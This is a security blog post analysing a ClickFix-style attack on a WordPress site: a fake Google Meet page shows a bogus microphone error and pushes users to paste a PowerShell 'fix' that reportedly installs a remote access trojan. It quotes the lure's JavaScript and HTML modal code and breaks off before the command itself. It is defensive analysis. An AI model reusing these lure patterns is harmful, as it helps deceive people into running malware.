Last month, a customer reached out to us after noticing suspicious URLs on their WordPress site. Visitors reported being prompted to perform unusual actions.

We began our investigation, scanning the site for common malware indicators and looking for signs of obfuscated JavaScript or injected iframes. What we found, however, was more subtle and potentially more dangerous.

We have seen [similar infections](https://blog.sucuri.net/2025/02/wordpress-clickfix-malware-causes-google-warnings-and-infected-computers.html) previously where the attacker would ask the users to run PowerShell commands on their system.

## What Did We Find?

We discovered an HTML file meticulously crafted to resemble the Google Meet interface. This fake Google Meet page doesn’t present a login form to steal credentials directly. Instead, it employs a social engineering tactic, presenting a fake “Microphone Permission Denied” error and urging the user to copy and paste a specific PowerShell command as a “fix.”

We published [an article](https://blog.sucuri.net/2025/03/fake-cloudflare-verification-results-in-lummastealer-trojan-infections.html) in March where we discussed similar tactics being used in the fake CloudFlare overlays.

# Analysis of the Code

## The HTML Part

The code presents a social engineering attack using a malicious HTML page disguised to trick users into executing a PowerShell command that downloads and runs a RAT.

### Social Engineering via Fake Error Message

The code attempts to socially engineer the user by displaying a fake error message.

```
micButton.addEventListener("click", function() {
            if (!micPermissionGranted) {
              navigator.mediaDevices.getUserMedia({ audio: true })
                .then(function(stream) {
                  stream.getTracks().forEach((track) => track.stop());
                  micPermissionGranted = true;
                  micMuted = false;
                  updateButton(micButton, micOnSrc, unmutedColor);
                  const extraButton = document.querySelector(".extra-button");
                    if (extraButton) {
                      updateExtraButton(extraButton);
                    }
                })
                .catch(function(error) {
                  console.error("Microphone permission denied:", error);
                });
            } else {
              micMuted = !micMuted;
              if (micMuted) {
                updateButton(micButton, micOffSrc, mutedColor);
              } else {
                updateButton(micButton, micOnSrc, unmutedColor);
              }
            }
          });
```

While the code does try to access the microphone, the error and the subsequent “fix” are likely fabricated to manipulate the user.

The key point is that the displayed error message, claiming “Microphone permission denied,” is used as a pretext to convince the user that something is wrong and needs fixing.

### The “Ready to Join?” Section and the Fake Error Modal

On the right side of the fake Google Meet interface, the user is presented with a section enticing them to join:

```
<div class="right-panel">
    <div class="ready-title">Ready to join?</div>
    <button class="join-btn" id="openModalBtn">Join now</button>
    <button class="other-ways">
        Other ways to join <span class="arrow-down">▼</span>
    </button>
</div>
```

This is the primary button that, when clicked, triggers the display of the first modal. When the “Join now” button is clicked, the following modal is displayed:

```
<div class="overlay" id="overlay">
    <div class="modal">
        <h3 class="modal-title">Can't join the meeting</h3>
        <p class="modal-message" id="modalMessage">
            Sorry, an error has occurred when </br>
            joining the meeting. </p>
        <button class="modal-fix-button" id="fixButton" onclick="copyToClipboard()"...
